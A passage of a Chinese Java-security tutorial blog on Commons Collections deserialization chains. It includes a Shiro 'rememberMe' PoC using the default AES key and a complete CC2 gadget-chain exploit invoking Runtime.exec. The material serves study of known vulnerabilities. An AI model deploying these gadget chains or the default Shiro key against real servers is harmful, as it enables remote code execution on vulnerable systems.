<h3 id="对象序列化成字节数组"><a href="#对象序列化成字节数组" class="headerlink" title="对象序列化成字节数组"></a>对象序列化成字节数组</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对象 barr，这是一个内存中的缓冲区，用于暂时存储将要被序列化的对象数据</span></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//对象 oos，与 ByteArrayOutputStream 相关联，用于将对象写入 ByteArrayOutputStream</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//oos.writeObject(expMap) 将对象 expMap 序列化并写入 ByteArrayOutputStream 中</span></span><br><span class="line">oos.writeObject(expMap);</span><br><span class="line"></span><br><span class="line"><span class="comment">//oos.close() 关闭 ObjectOutputStream</span></span><br><span class="line">oos.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">//barr.toByteArray() 方法，将 ByteArrayOutputStream 中的数据转换为字节数组</span></span><br><span class="line">barr.toByteArray();</span><br></pre></td></tr></table></figure>

<h3 id="无数组cc6打shiro"><a href="#无数组cc6打shiro" class="headerlink" title="无数组cc6打shiro"></a>无数组cc6打shiro</h3><p>poc：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(com.xxx.class.getName());<span class="comment">//恶意类</span></span><br><span class="line">        <span class="type">byte</span>[] payloads = <span class="keyword">new</span> <span class="title class_">CommonsCollectionsShiro</span>().getpayload(clazz.toBytecode());</span><br><span class="line"></span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="javassist生成字节码"><a href="#javassist生成字节码" class="headerlink" title="javassist生成字节码"></a>javassist生成字节码</h3><p>在上边我们利用cc6打shiro时利用到了javassist，这是一个字节码操纵的第三方库，可以帮助我将恶意类生成字节码再交给 TemplatesImpl 。</p>
<h2 id="0x06-cc2"><a href="#0x06-cc2" class="headerlink" title="0x06 cc2"></a>0x06 cc2</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于在2015年底commons-collections反序列化利⽤链被提出时，Apache Commons Collections有以下两个分⽀版本：</p>
<ul>
<li>commons-collections:commons-collections</li>
<li>org.apache.commons:commons-collections4</li>
</ul>
<p>可⻅，groupId和artifactId都变了。前者是Commons Collections⽼的版本包，当时版本号是3.2.1；后 者是官⽅在2013年推出的4版本，当时版本号是4.0。</p>
<p>官⽅认为旧的commons-collections有⼀些架构和API设计上的问题，但修复这些问题，会产⽣⼤量不能 向前兼容的改动。所以，commons-collections4不再认为是⼀个⽤来替换commons-collections的新版 本，⽽是⼀个新的包，两者的命名空间不冲突，因此可以共存在同⼀个项⽬中。 那么很⾃然有个问题，既然3.2.1中存在反序列化利⽤链，那么4.0版本是否存在呢？</p>
<h3 id="commons-collections4的改动"><a href="#commons-collections4的改动" class="headerlink" title="commons-collections4的改动"></a>commons-collections4的改动</h3><p>因为这⼆者可以共存，所以我可以将两个包安装到同⼀个项⽬中进⾏⽐较：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commonscollections --&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"> 		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"> 		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"> 		<span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commonscollections4 --&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"> 		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"> 		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"> 		<span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">&lt;/dependencies</span><br></pre></td></tr></table></figure>

<p>因为⽼的Gadget中依赖的包名都是<code>org.apache.commons.collections</code> ，⽽新的包名已经变 了，是<code>org.apache.commons.collections4</code> 。 我们⽤已经熟悉的<code>CC6</code>利⽤链做个例⼦，我们直接把代码拷⻉⼀遍，然后将所<code>import org.apache.commons.collections.*</code> 改成 <code>import org.apache.commons.collections4.*</code> 。 此时IDE爆出了⼀个错误，原因是<code>LazyMap.decorate</code>这个⽅法没了：</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/18/65f8497a07a11.png"  alt="image-20221113163408075"></p>
<p>看下<code>decorate</code>的定义，⾮常简单：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line"> 	<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个⽅法不过就是<code>LazyMap</code>构造函数的⼀个包装，⽽在4中其实只是改了个名字叫<code>lazyMap</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;V, K&gt; LazyMap&lt;K, V&gt; <span class="title function_">lazyMap</span><span class="params">(<span class="keyword">final</span> Map&lt;K, V&gt; map, <span class="keyword">final</span></span></span><br><span class="line"><span class="params">Transformer&lt;? <span class="built_in">super</span> K, ? extends V&gt; factory)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>&lt;K,V&gt;(map, factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以，我们将Gadget中出错的代码换⼀下名字：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.lazyMap(innerMap, transformerChain);</span><br></pre></td></tr></table></figure>

<p><img   src="http://124.71.147.32/uploads/2024/03/18/65f84a9bca2ad.png"  alt="image-20221113163615717"></p>
<p>同理，之前的CC1,CC3利用链都可以在<code>commonscollections4</code>中正常使用</p>
<p><code>commons-collections</code>之所以有许多利⽤链，除了因为其使⽤量⼤，技术上的原因是其 中包含了⼀些可以执⾏任意⽅法的<code>Transformer</code>。所以在commons-collections中找<code>Gadget</code>的过 程，实际上可以简化为，找⼀条从 <code>Serializable#readObject()</code>⽅法到 <code>Transformer#transform()</code>⽅法的调⽤链。</p>
<h3 id="cc2"><a href="#cc2" class="headerlink" title="cc2"></a>cc2</h3><p>其中两个关键类：</p>
<ul>
<li>java.util.PriorityQueue </li>
<li>org.apache.commons.collections4.comparators.TransformingComparator</li>
</ul>
<p><code>java.util.PriorityQueue</code>是⼀个有⾃⼰<code>readObject()</code>⽅法的类：</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/18/65f84af8a78c7.png"  alt="image-20221113164323444"></p>
<p>org.apache.commons.collections4.comparators.TransformingComparator 中有调 ⽤<code>transform()</code>⽅法的函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> &#123;</span><br><span class="line"> 	<span class="keyword">final</span> <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">	<span class="keyword">final</span> <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line"> 	<span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以<code>CC2</code>实际就是⼀条从 <code>PriorityQueue</code>到<code>TransformingComparator</code>的利⽤链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">	PriorityQueue.readObject()</span><br><span class="line">	PriorityQueue.heapify()</span><br><span class="line">	PriorityQueue.siftDown()</span><br><span class="line">	PriorityQueue.siftDownUsingComparator()</span><br><span class="line">	</span><br><span class="line">			TransformingComparator.compare()</span><br><span class="line">				InvokerTransformer.transform()</span><br><span class="line">					Method.invoke()</span><br><span class="line">						Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>开始编写POC,⾸先，还是创建Transformer:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br></pre></td></tr></table></figure>

<p>再创建⼀个<code>TransformingComparator</code>，传⼊我们的Transformer</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Comparator comparator = new TransformingComparator(transformerChain);</span><br></pre></td></tr></table></figure>

<p>实例化<code>PriorityQueue</code>对象，第⼀个参数是初始化时的⼤⼩，⾄少需要2个元素才会触发排序和⽐较， 所以是2；第⼆个参数是⽐较时的<code>Comparator</code>，传⼊前⾯实例化的comparator</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>后⾯随便添加了2个数字进去，这⾥可以传⼊⾮null的任意对象，因为我们的Transformer是忽略传⼊参数的。 最后，将真正的恶意Transformer设置上，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers)</span><br></pre></td></tr></table></figure>

<p>完整payload：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object</span></span><br><span class="line"><span class="params">            value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;</span><br><span class="line">                    )&#125;;</span><br><span class="line"></span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">            <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain);</span><br><span class="line"></span><br><span class="line">            <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">            queue.add(<span class="number">1</span>);</span><br><span class="line">            queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">            setFieldValue(chain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">            oos.writeObject(queue);</span><br><span class="line">            oos.close();</span><br><span class="line">            System.out.println(barr);</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                    <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x07-cc4、5、7"><a href="#0x07-cc4、5、7" class="headerlink" title="0x07 cc4、5、7"></a>0x07 cc4、5、7</h2><p><a class="link"   href="https://www.cnblogs.com/gk0d/p/16886697.html" >https://www.cnblogs.com/gk0d/p/16886697.html<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h2><p><a class="link"   href="https://www.cnblogs.com/gk0d/category/2232825.html" >https://www.cnblogs.com/gk0d/category/2232825.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://govuln.com/docs/java-things/" >https://govuln.com/docs/java-things/<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>javaSec</tag>
      </tags>
  </entry>
</search>
